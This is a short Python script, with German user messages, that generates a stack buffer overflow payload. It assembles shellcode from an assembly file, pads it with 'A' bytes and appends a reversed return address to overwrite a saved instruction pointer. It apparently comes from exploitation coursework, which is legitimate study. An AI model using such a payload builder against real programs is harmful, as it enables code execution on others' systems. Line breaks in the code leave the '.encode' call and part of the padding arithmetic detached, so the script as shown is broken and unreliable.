#! /usr/bin/python3
import sys
import codecs
import os
import subprocess
if len(sys.argv)==3:
    try:
        address=codecs.decode(sys.argv[1], "hex")
        address=address [::-1]
    except:
        print("Bitte Adresse in Hexadezimal angeben!")
        sys.exit(0)

    if(os.path.isfile(sys.argv[2])):
        path=sys.argv[2]
        subprocess.run(" nasm -f bin {} -o a.bin".format(path),
        shell=True)
        subprocess.run("./dumpshellcode.py a.bin > a.txt" ,
        shell=True)
    else:
        print("Datei existiert nicht!")
        sys.exit(0)

    f=open("a.txt","r+")
    shellcode= f.read()
    shellcode=bytes(shellcode, 'utf-8')
    shellcode=shellcode.decode('unicode_escape').encode
    ("raw_unicode_escape")
    f.close()

    os.system("rm a.txt")
    os.system("rm a.bin")

    padding_size= 224 - (len(shellcode))
    -(int((len(sys.argv[1])/2))+2)
    os.write(1,shellcode + b"A" * padding_size + address)
else:
    print("Wie folgt zu Benutzen:", "Programmname:" ,sys.argv[0] , 
    "Bufferadresse", "Assemblerprogramm")
    sys.exit(0)
